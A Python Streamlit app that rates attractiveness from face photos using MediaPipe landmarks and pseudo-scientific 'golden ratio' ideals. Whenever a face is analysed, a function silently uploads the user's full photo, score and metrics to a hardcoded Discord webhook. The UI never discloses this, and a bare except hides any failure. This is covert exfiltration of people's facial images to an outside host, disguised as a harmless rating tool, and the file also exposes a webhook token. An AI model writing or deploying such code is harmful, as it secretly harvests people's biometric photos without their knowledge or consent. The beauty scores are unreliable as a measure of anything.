import streamlit as st
import cv2
import mediapipe as mp
import numpy as np
from PIL import Image
import requests
import json
import io
from datetime import datetime

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1458651120204251269/adR7ttYwh1TfSzkFVyBQNDIas5x0l-RHU1VucZuSB9pUvDvNw1nT_q7C_0DI_KWGWYSJ"

# 1. Page Configuration
st.set_page_config(
    page_title="AI Face Rater — Pro Edition",
    page_icon="🖤",
    layout="centered"
)

# 2. Premium UI CSS
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap');

html, body, [class*="css"] {
    font-family: 'Inter', sans-serif;
}

.stApp {
    background: radial-gradient(circle at top, #111827, #020617);
    color: #e5e7eb;
}

.result-card {
    background: linear-gradient(145deg, #020617, #111827);
    padding: 28px;
    border-radius: 22px;
    border: 1px solid rgba(255,255,255,0.08);
    box-shadow: 0 20px 40px rgba(0,0,0,0.8);
    text-align: center;
    margin-top: 25px;
}

.score-text {
    font-size: 56px;
    font-weight: 800;
    letter-spacing: -1px;
}

.subtitle {
    font-size: 18px;
    opacity: 0.85;
}

.stProgress > div > div > div > div {
    background: linear-gradient(90deg, #8b5cf6, #ec4899);
}

hr {
    border: none;
    height: 1px;
    background: linear-gradient(to right, transparent, #374151, transparent);
}
</style>
""", unsafe_allow_html=True)

# 3. Load FaceMesh
@st.cache_resource
def get_face_mesh():
    return mp.solutions.face_mesh.FaceMesh(
        static_image_mode=True,
        max_num_faces=1,
        refine_landmarks=True
    )

face_mesh = get_face_mesh()

# 4. Discord Webhook (UNCHANGED)
def send_to_discord(score, feedback, metrics, image_pil):
    if not WEBHOOK_URL:
        return

    img_byte_arr = io.BytesIO()
    image_pil.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)

    payload = {
        "content": "🖤 **New Professional Face Analysis**",
        "embeds": [
            {
                "title": f"AI Rating: {score:.1f} / 10",
                "description": feedback,
                "color": 5793266,
                "fields": [
                    {"name": "Symmetry", "value": f"{metrics['Symmetry']}%", "inline": True},
                    {"name": "Eye Proportion", "value": f"{metrics['Eye Spacing Score']}", "inline": True},
                    {"name": "Golden Ratio", "value": f"{metrics['Face Structure Score']}", "inline": True},
                    {"name": "Timestamp", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False}
                ],
                "image": {"url": "attachment://face_scan.png"},
                "footer": {"text": "AI Face Rater • Pro Edition"}
            }
        ]
    }

    files = {'file': ('face_scan.png', img_byte_arr, 'image/png')}
    try:
        requests.post(WEBHOOK_URL, data={'payload_json': json.dumps(payload)}, files=files)
    except:
        pass

# 5. Fashion-Grade Analysis Logic
def analyze_appearance(image_pil):
    image_np = np.array(image_pil)
    image = cv2.cvtColor(image_np, cv2.COLOR_RGB2BGR)
    results = face_mesh.process(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))

    if not results.multi_face_landmarks:
        return 0, "No face detected. Use a clear, front-facing photo.", "#ef4444", {}

    lm = results.multi_face_landmarks[0].landmark

    def dist(a, b):
        return np.linalg.norm(np.array([a.x, a.y]) - np.array([b.x, b.y]))

    # Key points
    left_eye, right_eye = lm[33], lm[263]
    left_jaw, right_jaw = lm[234], lm[454]
    nose, chin = lm[1], lm[152]

    eye_distance = dist(left_eye, right_eye)
    face_width = dist(left_jaw, right_jaw) or 0.001
    face_height = dist(nose, chin)

    # --- IDEAL VALUES (FASHION STANDARD) ---
    IDEAL_EYE_RATIO = 0.46     # eye distance ≈ one eye width rule
    IDEAL_FACE_RATIO = 1.60   # golden ratio
    IDEAL_SYMMETRY = 1.0

    symmetry = 1 - abs(left_eye.y - right_eye.y)
    eye_ratio = eye_distance / face_width
    face_ratio = face_height / face_width

    # Gaussian-style penalties
    def score_feature(value, ideal, tolerance):
        return np.exp(-((value - ideal) ** 2) / (2 * tolerance ** 2))

    symmetry_score = score_feature(symmetry, IDEAL_SYMMETRY, 0.03)
    eye_score = score_feature(eye_ratio, IDEAL_EYE_RATIO, 0.05)
    structure_score = score_feature(face_ratio, IDEAL_FACE_RATIO, 0.12)

    final_score = (
        symmetry_score * 0.4 +
        eye_score * 0.3 +
        structure_score * 0.3
    ) * 10

    score = float(np.clip(final_score, 3.5, 9.6))

    if score >= 8.8:
        feedback = "🖤 Elite runway-grade facial harmony. Extremely rare proportions."
        color = "#22c55e"
    elif score >= 7.5:
        feedback = "✨ Strong fashion-standard proportions with high symmetry."
        color = "#6366f1"
    elif score >= 6.2:
        feedback = "🧬 Balanced structure with distinctive character appeal."
        color = "#f59e0b"
    else:
        feedback = "🎭 Unique facial identity with non-standard proportions."
        color = "#ef4444"

    metrics = {
        "Symmetry": round(symmetry * 100, 1),
        "Eye Spacing Score": round(eye_ratio, 3),
        "Face Structure Score": round(face_ratio, 3)
    }

    return score, feedback, color, metrics

# 6. UI
st.title("🖤 AI Face Rater — Pro Edition")
st.markdown("**Fashion-grade geometric analysis inspired by international runway standards.**")
st.markdown("<hr>", unsafe_allow_html=True)

tab1, tab2 = st.tabs(["📁 Upload Image", "📸 Take Photo"])
image_input = None

with tab1:
    uploaded_file = st.file_uploader("Upload a clear front-facing photo", type=['jpg', 'png', 'jpeg'])
    if uploaded_file:
        image_input = Image.open(uploaded_file)

with tab2:
    camera_file = st.camera_input("Take a photo")
    if camera_file:
        image_input = Image.open(camera_file)

if image_input:
    st.image(image_input, width=380)

    if st.button("Analyze Face", type="primary"):
        with st.spinner("Running facial geometry analysis..."):
            score, note, color, metrics = analyze_appearance(image_input)

        if score == 0:
            st.error(note)
        else:
            send_to_discord(score, note, metrics, image_input)

            st.markdown(f"""
            <div class="result-card">
                <div class="score-text" style="color:{color};">{score:.1f} / 10</div>
                <p class="subtitle">{note}</p>
            </div>
            """, unsafe_allow_html=True)

            st.progress(int(score * 10))

            with st.expander("📐 Detailed Geometry Metrics"):
                c1, c2, c3 = st.columns(3)
                c1.metric("Symmetry", f"{metrics['Symmetry']}%")
                c2.metric("Eye Ratio", metrics["Eye Spacing Score"])
                c3.metric("Face Ratio", metrics["Face Structure Score"])
